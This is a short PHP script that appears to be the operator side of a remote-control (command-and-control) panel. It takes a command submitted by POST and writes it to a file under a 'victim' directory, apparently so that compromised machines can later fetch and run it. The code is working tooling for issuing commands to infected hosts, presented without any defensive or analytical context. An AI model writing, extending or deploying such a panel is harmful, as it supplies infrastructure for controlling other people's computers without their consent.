<?php
@header("Content-Type:text/html;charset=utf-8");
if (!empty($_POST["cmd"])){
	$realtime_cmd = $_POST["cmd"];
	$fp = fopen("victim/rtcmd.txt", "w+");
	fwrite($fp, quotes($realtime_cmd));
	fclose($fp);
}

function quotes($content){
	if(get_magic_quotes_gpc()){
		if(is_array($content)){
			foreach($content as $key=>$value){
				$content[$key] = stripslashes($value);
			}
		}else{
			$content = stripslashes($content);}
	}else{}
	return $content;
}

?>